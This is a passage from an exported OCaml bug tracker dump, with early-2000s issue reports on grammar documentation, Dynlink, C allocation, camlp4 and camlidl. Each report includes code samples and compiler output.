f\n    \nmain.ml--------------\n\nlet _ = Dynlink.init()\nlet _ = Dynlink.init()  (* Needed to get the loaded code to crash *)\n\nlet loadit() = \n  try \n    let _ =\n      Dynlink.add_interfaces [\"Foo\"; \"Pervasives\"] [\"/work/hans/lib/ocaml/\";\n\"/hom/hans/QUA/tmp/bug/\"] in\n      Dynlink.loadfile \"bar.cmo\"\n  with Dynlink.Error e ->\n    Printf.printf \"Dynlink error : %s \" (Dynlink.error_message e)\n\n\nlet _ = loadit()\n\n(* Test it *)\nlet _ = Foo.do_bar ()\n\n------\nocamlc -c foo.ml\nocamlc -c bar.ml\nocamlc foo.cmo dynlink.cma main.ml\n\n./a.out\n"},{"labels":["bug"],"text":"**Original bug ID:** 1639\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Sungwoo Park\nVersion: 3.06\nOS: Redhat Linux 6.2\nSubmission from: gs100.sp.cs.cmu.edu (128.2.205.110)\n\n\nHello,\n\nI am trying to create a two dimensional array using alloc() in the C realm,\nwhich I want to pass to the Ocaml realm via a callback function.\n\nI wonder if there is any limit on the memory that alloc() can use.\nIt seems to me that when alloc() allocates many arrays, an abnormal allocation\noccurs: alloc() attempts to use a memory chunk that has already been allocated.\n\nBelow is the original code (no need to read it at the moment):\n\n  fprintf(stdout, \"raw_map.config.x_size = %d\\n\", raw_map.config.x_size);\n  fprintf(stdout, \"raw_map.config.y_size = %d\\n\", raw_map.config.y_size);\n  ocaml_raw_map = alloc(raw_map.config.x_size, 0);\n  for (x = 0; x < raw_map.config.x_size; x++) {\n    // floating point numbers take 2 words.\n    ocaml_raw_map_line = alloc(2 * raw_map.config.y_size, Double_array_tag);\n    fprintf(stdout, \"ocaml_raw_map_line[%d] = %0x\\n\", x, ocaml_raw_map_line);\n    for (y = 0; y < raw_map.config.y_size; y++)\n      Store_double_field(ocaml_raw_map_line, y, (double)(raw_map.map[x][y]));\n        // (double)(raw_map.complete_map + x * raw_map.config.y_size + y));\n    Store_field(ocaml_raw_map, x, ocaml_raw_map_line);\n  }\n\nHere is an equivalent code:\n\n  fprintf(stdout, \"x_size = %d, y_size\\n\", x_size, y_size);\n  ocaml_raw_map = alloc(x_size, 0);\n  for (x = 0; x < x_size; x++) {\n    ocaml_raw_map_line = alloc(2 * y_size, Double_array_tag);\n    fprintf(stdout, \"ocaml_raw_map_line[%d] = %0x\\n\", x, ocaml_raw_map_line);\n    /* ... */\n    Store_field(ocaml_raw_map, x, ocaml_raw_map_line);\n  }\n\nBasically what it does is to allocate an array of length '2 * y_size'\n'x_size' times.\nWith x_size = 477 and y_size 170, I get some erroneous result.\nHere is the output:\n\nraw_map.config.x_size = 477\nraw_map.config.y_size = 170\nocaml_raw_map_line[0] = 4024f30c\nocaml_raw_map_line[1] = 4024edb8\nocaml_raw_map_line[2] = 4024e864\nocaml_raw_map_line[3] = 4024e310\nocaml_raw_map_line[4] = 4024ddbc\nocaml_raw_map_line[5] = 4024d868\nocaml_raw_map_line[6] = 4024d314\nocaml_raw_map_line[7] = 4024cdc0\n....\nocaml_raw_map_line[183] = 4024fa84    <- 4024fa84 is used here.\nocaml_raw_map_line[184] = 4024f530    <- 4024f530 is used here.\nocaml_raw_map_line[185] = 4024efdc    <- ...\nocaml_raw_map_line[186] = 4024ea88\nocaml_raw_map_line[187] = 4024e534\nocaml_raw_map_line[188] = 4024dfe0\nocaml_raw_map_line[189] = 4024da8c\nocaml_raw_map_line[190] = 4024d538\nocaml_raw_map_line[191] = 4024cfe4\nocaml_raw_map_line[192] = 4024ca90\nocaml_raw_map_line[193] = 4024c53c\nocaml_raw_map_line[194] = 4024bfe8\n....\nocaml_raw_map_line[377] = 4024fa84    <- 4024fa84 is used again.\nocaml_raw_map_line[378] = 4024f530    <- 4024f530 is used again.\nocaml_raw_map_line[379] = 4024efdc    <- ...\nocaml_raw_map_line[380] = 4024ea88\nocaml_raw_map_line[381] = 4024e534\nocaml_raw_map_line[382] = 4024dfe0\nocaml_raw_map_line[383] = 4024da8c\nocaml_raw_map_line[384] = 4024d538\nocaml_raw_map_line[385] = 4024cfe4\nocaml_raw_map_line[386] = 4024ca90\nocaml_raw_map_line[387] = 4024c53c\nocaml_raw_map_line[388] = 4024bfe8\n....\nocaml_raw_map_line[468] = 402b7b5c\nocaml_raw_map_line[469] = 402b7608\nocaml_raw_map_line[470] = 402b70b4\nocaml_raw_map_line[471] = 402b6b60\nocaml_raw_map_line[472] = 402b660c\nocaml_raw_map_line[473] = 402b60b8\nocaml_raw_map_line[474] = 402b5b64\nocaml_raw_map_line[475] = 402b5610\nocaml_raw_map_line[476] = 402b50bc\n\nThe code consumes a total of 477 * 170 * 8 bytes = 648720 bytes < 1 Mbytes.\nI wonder if this happens because there is some limit on the number of times\nalloc() can allocate memory, or on the total memory that alloc() can use.\nI think the latter is not the case as my current workaround is to allocate\na single array holding all the elements in the two dimensional array (thus,\nof the same size).\n\n- Sungwoo\n"},{"labels":["bug"],"text":"**Original bug ID:** 1638\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nDebian Linux obviously packages things a bit differently in\nrecent times. The header file for the dbm-library is now named\n\"/usr/include/gdbm-ndbm.h\". You will have to update \"configure\" and\nconditionally compile file \"otherlibs/dbm/cdbm.h\" to account for this. I\nhave superficially tested the change, and it seems to work.\n\nBest regards,\nMarkus\n\n-- \nMarkus Mottl          http://www.oefai.at/~markus          markus@oefai.at\n"},{"labels":["bug"],"text":"**Original bug ID:** 1637\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Steve Bishop\nVersion: 3.06\nOS: WinXP SP1\nSubmission from: thalamus.cl.cam.ac.uk (128.232.8.182)\n\n\n\nUsing create_process_env to call one Caml program from another produces odd\nbehaviour from the Unix socket calls. See the code samples below.\n\nIf test1 is executed, test2 fails because socket() raises an exception, although\nit has an error message of \"The operation completed successfully\".\n\nIf test1 is changed to use create_process instead then all works fine.\n\n\n====test1.ml====\nopen Unix;;\n\nlet envarray = Array.of_list [] in\nlet argarray = Array.of_list [] in\nlet prog_path = \"{the correct path}\\\\test2.exe\" in\nlet pid = create_process_env prog_path argarray envarray stdin stdout stderr in\nignore(waitpid [] pid);;\n================\n\n\n====test2.ml=====\nopen Unix;;\n(try ignore(socket PF_INET SOCK_STREAM 6)\nwith Unix_error(e, s1, s2) -> perr_endline((error_message e)^\",\"^s1^\",\"^s2));\nprerr_endline \"Socket created OK\";;\n=================\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1635\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for CamlIDL use https://github.com/xavierleroy/camlidl/issues\n\n## Bug description\n\nThe following errors are not detected by camlidl compiler so it generates\nthe wrong .ml/.mli files.\n\n[--- test.idl---]\nstruct Container {\n  enum NotExistingEnumName member1;\n  struct NotExistingStructName member2;\n};\n[--- end of test.idl ---]\n\nproduces\n\n[--- test.ml---]\n(* File generated from test.idl *)\n\ntype notExistingEnumName =\nand container = {\n  member1: notExistingEnumName;\n  member2: notExistingStructName;\n}\n[--- end of test.ml ---]\n\n- Dmitry Bely\n"},{"labels":["bug"],"text":"**Original bug ID:** 1633\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nTo get the SRPM to rebuild under RedHat 9, I had to add\n\t%define debug_package %{nil}\nat the top of the SPEC file (this disables some change to RPM that OCaml \ndoes not like, and is more of a workaround than a fix).\n\nI also had to add\n\t%{_mandir}/mano/*\nto the %files section.\n\nSteven\n"},{"labels":["bug"],"text":"**Original bug ID:** 1632\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nI don't know what you guys want to do with this stream of syntax bugs\nI'm feeding you.  Let me know if there's an issue.\n\nThe precedence table at http://caml.inria.fr/ocaml/htmlman/manual015.html\nsays that functor application binds more tightly than constructor\napplication.  In the present implementation they appear to have the\nsame precedence:\n\n   # type x = C of int;;\n   type x = C of int\n   # let f x = x + 2;;\n   val f : int -> int = <fun>\n   # C f 2;;\n   Characters 4-5:\n     C f 2;;\n         ^\n   Syntax error\n   #  \n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1631\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe precedence chart at\nhttp://caml.inria.fr/ocaml/htmlman/manual015.html says that \"=\" binds\nmore tightly than \"not\" in the same sense that \"*\" binds more tightly \nthan \"+\".  The implementation disagrees:\n\n   # not 3 = 4;;\n   Characters 4-5:\n     not 3 = 4;;\n         ^\n   This expression has type int but is here used with type bool\n\nI like the documented behavior better than the implemented behavior.\nI think this would be a compatible change, except in the presence of\nperverse redefinitions of not:\n\n   # let not x = true;;\n   val not : 'a -> bool = <fun>\n   # not true = false;;\n   - : bool = false\n   # (not true) = false;;\n   - : bool = false\n   # not (true = false);;\n   - : bool = true\n   #  \n\nChanging the implementation to be consistent with the documentation\nwould be almost compatible because if \"(not x) = y\" typechecks and not\nmeans boolean negation, then \"(not x) = y\" is the same as \n\"not (x = y)\".\n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1628\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nUsing the grammar from the document, I get:\n\n   expr ::= ncconstr expr\n        ::= ncconstr (3, [])\n        ::= ncconstr-name (3, [])\n        ::= :: (3, [])\n\nHowever the implementation won't take \"::(3,[])\" as an expression.\n\nI think the grammar in the document is wrong.  I don't think it's a\ngood idea to try to accept \"::\" as both prefix and infix.\n\nThe questionable step in the derivation above is \"::\" being an\nncconstr-name.  This production is used when deriving\n\n   type-definition ::= type x = :: of int * int\n\nwhich is valid according to both the documented grammar and the\nimplementation.  I think this is the only place you want to accept \"::\"\nas a non-constant constructor name.\n\nThe best fix I can think of is to add this production to the document:\n\n   ncconstr-name-typedef ::= capitalized_ident | ::\n\nand modify this one as follows:\n\n   constr-decl ::= cconstr-name | ncconstr-name-typedef of typexpr\n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1627\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe following is accepted by the ocaml toplevel:\n\n   match `X with `X -> 3;;\n\nHowever, the documented grammar for patterns at\n\n   http://caml.inria.fr/ocaml/htmlman/manual014.html\n\nsays that occurrences of `tag-name have to be followed by a pattern.\nThis is not the case for the above expression.  The above expression\nis obviously good, so the problem is with the document.  I think the\nproduction for pattern should have this added:\n\n   pattern ::= ...\n             | `tag-name\n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1626\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for CamlIDL use https://github.com/xavierleroy/camlidl/issues\n\n## Bug description\n\nLooks like there is a bug related to such methods:\n\n[--- test.idl---]\nvoid getArray( [out,size_is(aLen)] byte** a, [out] int* aLen );\n/*\nworks\n*/\n\n[\n    object\n]\ninterface ITest: IUnknown\n{\n    HRESULT getArray( [out,size_is(aLen)] byte** a, [out] int* aLen );\n}\n/*\ndoes not work:\n\ntest.idl\ntest.idl, function ITest::getArray: Out parameter `a' must be a pointer\n*/\n[--- end of test.idl ---]\n\n- Dmitry Bely\n"},{"labels":["bug"],"text":"**Original bug ID:** 1623\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christophe Poucet\nVersion: 3.06\nOS: Windows\nSubmission from: ncasse01.telenet-ops.be (213.224.83.38)\n\n\nWhen using ref's sometimes it will change the type specification of the\nmonomorphic type yet not add the given param, perhaps this will explain better:\n-------------------------------------------------------------------\n# let x = ref[];;\nval x : '_a list ref = {contents = []}\n# x := (function y -> y)::!x;;\n# x;;\n- : ('_a -> '_a) list ref = {contents = [<fun>]}\n# x := (function f -> f f)::!x;;\nCharacters 22-23:\n  x := (function f -> f f)::!x;;\n                        ^\nThis expression has type 'a -> 'b but is here used with type 'a\n# x;;\n- : (('_a -> '_b) -> '_a -> '_b) list ref = {contents = [<fun>]}\n-------------------------------------------------------------------\nIt -does- change the type of x, yet it doesn't add the function to the list....\n\nIs this a bug, or am I missing something?\n\nChristophe Poucet\n"},{"labels":["bug"],"text":"**Original bug ID:** 1622\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christophe Poucet\nVersion: 3.06\nOS: Windows\nSubmission from: ncasse01.telenet-ops.be (213.224.83.38)\n\n\nWhen using ref's sometimes it will change the type specification of the\nmonomorphic type yet not add the given param, perhaps this will explain better:\n-------------------------------------------------------------------\n# let x = ref[];;\nval x : '_a list ref = {contents = []}\n# x := (function y -> y)::!x;;\n# x;;\n- : ('_a -> '_a) list ref = {contents = [<fun>]}\n# x := (function f -> f f)::!x;;\nCharacters 22-23:\n  x := (function f -> f f)::!x;;\n                        ^\nThis expression has type 'a -> 'b but is here used with type 'a\n# x;;\n- : (('_a -> '_b) -> '_a -> '_b) list ref = {contents = [<fun>]}\n-------------------------------------------------------------------\nIt -does- change the type of x, yet it doesn't add the function to the list....\n\nIs this a bug, or am I missing something?\n\nChristophe Poucet\n"},{"labels":["bug"],"text":"**Original bug ID:** 1621\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe documentation for the Thread libraries (3.06 distribution) implies\nthat the libraries are not supported in native code under Windows.  At\nleast in my mingw installation, they seem to work fine.  It would be\ngreat if this were clearer.  I almost suffered a heart attack before\nrealizing this, as I needed to do non-blocking I/O in native code\nwithout Cygwin and the documentation for the Unix library said I\nneeded threads!\n\nThanks for some fantastic software.\n\nWheeler\n-- \nWheeler Ruml, Palo Alto Research Center, Rm 1522, 650-812-4329 voice\nruml@parc.com, http://www.parc.com/ruml           650-812-4334 fax\n"},{"labels":["bug"],"text":"**Original bug ID:** 1620\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Julien Signoles\nVersion: 3.06\nOS: Linux\nSubmission from: newwww.lri.fr (129.175.15.10)\n\n\nBonjour\n\nJ'avais soumis ce probleme a Daniel de Rauglaudre lorsqu'il developpait encore\ncamlp4. Je crois qu'il ne l'a pas corrige.\n\n$ cat foo.ml\nmodule X = struct type t = A end\nlet X.A = X.A\n$ camlp4o pr_o.cmo foo.ml\nmodule X =\n  struct\n    type t =\n        A\n  end\nlet<pr_fun: not impl: patt; tag = 0>= X.A\n\n--\nJulien Signoles\n"},{"labels":["bug"],"text":"**Original bug ID:** 1619\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe grammar in the document doesn't make a special case for [assert].\nThis would make sense if we pretend that [assert] is a function and\ndon't worry too much about the compiler stripping out assert\nstatements when it's told to.  However, if assert is a function then\n[assert] by itself has to be a valid expression, and it isn't:\n\n   # assert;;\n   Characters 6-8:\n     assert;;\n           ^^\n   Syntax error\n   #  \n\nThus I think you want another case for expr:\n\n   expr ::= ...\n      | assert expr\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1618\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: chris quinn\nVersion: 3.06\nOS: linux\nSubmission from: 212.42.169.63 (212.42.169.63)\n\n\nconsider\necho val p: int > p1.mli\necho val q: int > p2.mli\nocamlc -c p2.mli; objinfo p2.cmi\nocamlc -c p1.mli p2.mli\n\nobjinfo p1.cmi p2.cmi shows that the digest of p2 is different \nto that generated when p2.mli is compiled singly.\n\nthough this does not cause problems normally,\nit can do so in the case the unchanged interface is recompiled separately later\nand invalidate all dependent compiled modules.\n\ni would like to compile an interface in memory under an arbitrary Env.t and\ngenerate the same signature as would pop out normally. i don't think i can do so\nthis with the current compiler.\ni think it is down to ident binding times, to which a signature ideally ought to\nbe invariant, no?\n\n- chris\n"},{"labels":["bug"],"text":"**Original bug ID:** 1617\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello.\n\nThe ocaml reference manual contains a table of the precedence levels of\ndifferent operators <http://caml.inria.fr/ocaml/htmlman/manual015.html>.\nIn the table there is an entry \"not\", listed as having lower precedence\nthan eg. the equality operators. I guess the idea is that you could say\n\"not a = b\" without parenthesis.\n\nNow this seems like a horribly bad idea, since \"not\" is an ordinary\nfunction identifier like any other. Thankfully, judging from ocaml's\nbehavior and from the sources, it seems like \"not\" is not given any\nspecial treatment.\n\nSo the entry in the manual's precedence table probably ought to be\nremoved.\n\n\nLauri Alanko\nla@iki.fi\n"},{"labels":["bug"],"text":"**Original bug ID:** 1616\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Vanicat Remi\nVersion: 3.06 et cvs\nOS: \nSubmission from: ca-bordeaux-20-28.abo.wanadoo.fr (80.8.92.28)\n\n\nBonjour. \n\nSi j'ai le fichier .ml suivant :\ntest.ml :\nclass ['a] container id =\nobject(s:'s)\n  val mutable id = (id : 'a)\n \n  method set (x : 'a) =\n    x #add_container s\nend;;\n\nalors la suite d'opÃ©ration suivante donne un rÃ©sulat pour le moins Ã©trange :\nmoi@debian:~/lang/ocaml/test/bug$ ocamlc -i -c test.ml > test.mli_tmp\nmoi@debian:~/lang/ocaml/test/bug$ mv test.mli_tmp test.mli\nmoi@debian:~/lang/ocaml/test/bug$ rm *.cm*\nmoi@debian:~/lang/ocaml/test/bug$ ocamlc -c test.ml\nThe implementation test.ml does not match the interface test.cmi:\nClass declarations do not match:\n  class ['a] container :\n    'a ->\n    object\n      constraint 'a = < add_container : < set : 'a -> 'b; .. > -> 'b; .. >\n      val mutable id : 'a\n      method set : 'a -> 'b\n    end\ndoes not match\n  class ['a] container :\n    'a ->\n    object\n      constraint 'a = < add_container : < set : 'a -> 'b; .. > -> 'b; .. >\n      val mutable id : 'a\n      method set : 'a -> 'b\n    end\nOne type parameter has type\n  < add_container : < set : 'a -> 'b; .. > -> 'b; .. > as 'a\nbut is expected to have type\n  < add_container : < set : 'c -> 'd; .. > -> 'd; .. > as 'c\n\nil semble que ce soit \"juste\" un problÃ¨me d'affichage du type.\n\nUne version similaire sans le \n  val mutable id = (id : 'a)\ncompile sans problÃ¨me....\n"},{"labels":["bug"],"text":"**Original bug ID:** 1615\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #5920\n\n## Bug description\n\nI've used ocamlc 3.06 under cygwin since it was released and this is the\nfirst time that I have seen this happen.\n\nI have a program that causes ocamlc to crash when it is linked with the\n-g flag and completes successfully without.\n\nWhat additional information can I provide?\n\nquimby-xp$ uname -a\nCYGWIN_NT-5.1 quimby-xp 1.3.22(0.78/3/2) 2003-03-18 09:20 i686 unknown unknown Cygwin\nquimby-xp$ ocamlc -g -o cpp_fe.exe str.cma ../ll1a/pvs.cma ../ll1a/ll1a.cma ast.cmo ast_formatter.cmo parser.cmo scanner.cmo main.cmo\nFatal error: exception Invalid_argument(\"String.create\")\nquimby-xp$ ocamlc -o cpp_fe.exe str.cma ../ll1a/pvs.cma ../ll1a/ll1a.cma ast.cmo ast_formatter.cmo parser.cmo scanner.cmo main.cmo\nquimby-xp$\n"},{"labels":["bug"],"text":"**Original bug ID:** 1611\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Julien Signoles\nVersion: 3.06\nOS: Linux\nSubmission from: newwww.lri.fr (129.175.15.10)\n\n\nBonjour,\n\nLe probleme decrit ci-dessous correspond soit a une specification pas claire\ndans le manuel (section 6.10.4), soit a un bug :\n\n# module type T = sig type t module X : sig type xt = t end end;;\nmodule type T = sig type t module X : sig type xt = t end end\n# module X = struct type xt = int end;;\nmodule X : sig type xt = int end\n# module type U = T with module X = X and type t = int;;\nIn this `with' constraint, the new definition of X\ndoes not match its original definition in the constrained signature:\nModules do not match:\n  sig type xt = int end\nis not included in\n  sig type xt = t end\nType declarations do not match: type xt = int is not included in type xt = t\n# module type U = T with type t = int and module X = X;;\nmodule type U = sig type t = int module X : sig type xt = int end end\n\nLe \"and\" dans un \"with\" n'est donc pas commutatif : ca ne semble pas\ncorrespondre a ce qu'il y a d'indiquer dans le manuel de reference.\n\nJulien Signoles\n"},{"labels":["bug"],"text":"**Original bug ID:** 1610\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nJ'aimerais bien pouvoir mettre du code avec des streams en \ncommentaire...\n--f\n\n\nfrouaix:/tmp$ cat /tmp/x.ml\n(*\nlet foo  = [< '\"x\" >]\n*)\nfrouaix:/tmp$ ocamlc -pp camlp4o x.ml\nFile \"x.ml\", line 1, characters 0-28:\nLexing error: string not terminated\nPreprocessor error\nfrouaix:/tmp$ cat /tmp/x.ml\nlet foo  = [< '\"x\" >]\nfrouaix:/tmp$ ocamlc -pp camlp4o x.ml\nfrouaix:/tmp$\n"},{"labels":["bug"],"text":"**Original bug ID:** 1608\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nAh, c'est dur quand on veut utiliser tous les traits a la fois...\n\nfrouaix:/tmp$ cat x.ml\nclass foo = fun ?x ->\n   object\n   end\nfrouaix:/tmp$ ocamlc -v\nThe Objective Caml compiler, version 3.06+21 (2003-01-08)\nStandard library directory: /usr/local/lib/ocamlexp/lib/ocaml\nfrouaix:/tmp$ ocamlc -c x.ml\nFile \"x.ml\", line 1, characters 17-18:\nWarning: This optional argument cannot be erased\nfrouaix:/tmp$ ocamlc -pp camlp4o x.ml\nFile \"x.ml\", line 1, characters 16-18:\nParse error: [class_fun_def] expected after 'fun' (in [class_expr])\nPreprocessor error\nfrouaix:/tmp$\n\n\n--f\n"},{"labels":["bug"],"text":"**Original bug ID:** 1606\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\ncafe[14:17]%cat > bug.ml\nclass type ['a] o = object end\nclass type c = object method m : 'a. 'a #o as 'a end\ncafe[14:17]%ocamlc -i bug.ml\nclass type ['a] o = object  end\nclass type c = object method m : 'a #o as 'a end\ncafe[14:17]%ocamlc -i bug.ml > bug.mli\ncafe[14:17]%ocamlc bug.mli\nFile \"bug.mli\", line 2, characters 10-48:\nSome type variables are unbound in this type:\n  class type c = object method m : 'a #o as 'a end\nThe method m has type 'a #o as 'a where .. is unbound\n"},{"labels":["bug"],"text":"**Original bug ID:** 1605\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\ncafe[13:50]%cat > bug.ml\ntype t = [ `A of < m : t > ]\ncafe[13:50]%ocamlc -i bug.ml\ntype t = [ `A of < m : t >]\ncafe[13:50]%ocamlc -i bug.ml > bug.mli\ncafe[13:51]%ocamlc bug.mli\nFile \"bug.mli\", line 1, characters 25-27:\nSyntax error\n\n(CVS version)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1602\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: chris quinn\nVersion: 3.06\nOS: linux\nSubmission from: 212.42.169.63 (212.42.169.63)\n\n\nif a module Y to be loaded depends on the module X doing the loading\n(init,loadfile),\nthere is a complaint:\n\"error while linking y.cmo.\nThe module `X' is not yet initialized\"\n\nwhich seems curious given that X is up and running.\nbefore i found that making Y independent of X did the trick i\ntried loadfile \"x.cmo\" before the load of y, and this resulted in a segfault.\n\nabout the path argument to [add_interfaces]: it had to include the standard\nlibrary path, and i thought of using Config.standard_library but unfortunately\nthis is internal to the compiler. if there is not something else i can use,\nwould it not be useful to make at least some of the ocaml configuration\navailable to the programming environment?\n\nthanks\n- chris\n\nx.ml-----------\nclass k = object\n  method init : unit = assert false\nend\n\nlet reg = ref (new k)\n\nlet _ =\n  try\n    Dynlink.init();\n    Dynlink.add_interfaces\n      [\"X\";\"Dynlink\";\"Digest\";\"Y\";\"CamlinternalOO\";\"Pervasives\"]\n      [\"\";\"/home/cq/programming/projects/SA-MetaTool/lib/ocaml\"];\n    Dynlink.loadfile \"y.cmo\";\n    !reg#init;\n  with\n  | Dynlink.Error z -> print_endline(\"ERROR: \"^Dynlink.error_message z)\n\ny.ml--------------\n\nclass k = object\n  method init : unit = print_endline \"Y registered\"\nend\n\nlet _ =\n  X.reg:= new k\n\n------\nocamlc -c x.ml\nocamlc -c y.ml\nocamlc -o test dynlink.cma x.cmo\n"},{"labels":["bug"],"text":"**Original bug ID:** 1601\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIn the same vein as bug 1600 concerning \"mod\", the document doesn't\nmention that any of the infix bitwise arithmetic operators are infix.\n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1600\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nI think \"mod\" should included as a case for the \"infix-op\" grammar\nproduction in\n\n   http://caml.inria.fr/ocaml/htmlman/manual015.html\n\nand infix-op should be moved to manual011.html and the \"operator-name\"\nproduction should be rewritten to\n\n   operator-name ::= prefix-symbol | infix-op\n\nIf you don't want to redefine operator-name, you'll have to add \"mod\"\nto the list of special cases for operator-name too, so \"(mod)\" is then\na valid expression.\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1599\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nPetit souci avec les classes.\nJe me bagarre avec le coup des \"self\" passÃ©s Ã  un autre objet.\nPour compiler il faut avoir OCaml-mysql installÃ©.\nLes sources sont sur pauillac dans ~rouaix/public_html/BUGS/20030317\nie. http://pauillac.inria.fr/~rouaix/BUGS/20030317/\n\nBon courage,\n--f\n\nfrouaix:~/Documents/src/FRX/jaws$ make\nocamlfind ocamlc -thread -package \"mysql\" -g -c sql.ml\nocamlfind ocamlc -thread -package \"mysql\" -g -c sqlschema.ml\nFatal error: exception Assert_failure(\"typing/ctype.ml\", 183, 27)\nmake: *** [sqlschema.cmo] Error 